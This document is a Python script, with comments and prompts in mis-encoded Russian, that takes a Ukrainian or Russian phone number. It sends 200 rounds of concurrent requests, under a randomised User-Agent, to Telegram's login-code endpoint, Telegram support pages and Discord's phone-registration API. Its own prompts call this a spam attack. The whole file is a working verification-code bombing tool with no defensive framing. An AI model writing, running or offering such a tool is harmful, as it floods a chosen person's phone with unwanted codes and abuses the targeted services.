import aiohttp
import asyncio
import re
import sys
import time
from fake_useragent import UserAgent

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ User-Agent
user = UserAgent().random
headers = {'User-Agent': user}

# –§—É–Ω–∫—Ü–∏—è –∞–Ω–∏–º–∞—Ü–∏–∏ –ø–µ—á–∞—Ç–∞–Ω–∏—è
def print_typing(text: str, delay: float = 0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # –ü–µ—Ä–µ–≤–æ–¥ —Å—Ç—Ä–æ–∫–∏ –≤ –∫–æ–Ω—Ü–µ

# –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (—Ç–æ–ª—å–∫–æ –£–∫—Ä–∞–∏–Ω–∞ +380 –∏ –†–æ—Å—Å–∏—è +7)
def is_valid_phone(phone: str) -> bool:
    phone = phone.strip()
    if phone.lower() == 'exit':
        return False
    if not re.match(r'^\+\d+$', phone):
        return False
    if phone.startswith('+380') and len(phone) == 13:
        return True
    if phone.startswith('+7') and len(phone) == 12:
        return True
    return False

# URL-–∞–¥—Ä–µ—Å–∞ –¥–ª—è –∞—Ç–∞–∫ (–æ—á–∏—â–µ–Ω—ã –æ—Ç –ø—Ä–æ–±–µ–ª–æ–≤)
urls = [
    'https://my.telegram.org/auth/send_password',
    'https://telegram.org/support?setln=ru',
    'https://my.telegram.org/auth/',
    'https://discord.com/api/v9/auth/register/phone'
]

max_rounds = 200

async def send_request(session, url, data=None):
    try:
        if data:
            async with session.post(url, headers=headers, data=data) as response:
                return await response.text()
        else:
            async with session.get(url, headers=headers) as response:
                return await response.text()
    except Exception as e:
        print_typing(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ {url}: {e}", delay=0.01)
        return None

async def attack(session, phone):
    tasks = []
    data = {'phone': phone}
    for url in urls:
        if 'send_password' in url or 'register' in url:
            tasks.append(send_request(session, url, data))
        else:
            tasks.append(send_request(session, url))
    await asyncio.gather(*tasks)

async def main():
    while True:
        number = input('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ +380XXXXXXXXX –∏–ª–∏ +7XXXXXXXXXX (–∏–ª–∏ "exit" –¥–ª—è –≤—ã—Ö–æ–¥–∞): ').strip()
        if number.lower() == 'exit':
            print_typing("üö™ –í—ã—Ö–æ–¥ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã...", delay=0.04)
            return
        if is_valid_phone(number):
            break
        else:
            print_typing("‚ùå –ú—ã –Ω–µ –ø—Ä–∏–Ω–∏–º–∞–µ–º —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –æ–Ω —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ñ–æ—Ä–º–∞—Ç—É –£–∫—Ä–∞–∏–Ω—ã (+380) –∏–ª–∏ –†–æ—Å—Å–∏–∏ (+7).", delay=0.02)

    input('–ù–∞–∂–º–∏—Ç–µ ENTER, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å —Å–ø–∞–º-–∞—Ç–∞–∫—É –Ω–∞ –ø–æ–¥–¥–µ—Ä–∂–∫—É TELEGRAM...')
    print_typing("üöÄ –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏...", delay=0.05)

    async with aiohttp.ClientSession() as session:
        for i in range(1, max_rounds + 1):
            await attack(session, number)
            print_typing(f"‚úÖ –†–∞—É–Ω–¥ –∞—Ç–∞–∫–∏ {i} –∑–∞–≤–µ—Ä—à—ë–Ω", delay=0.02)

    print_typing("üéâ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞. –í—Å–µ –∫—Ä—É–≥–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω—ã.", delay=0.04)

if __name__ == "__main__":
    asyncio.run(main())
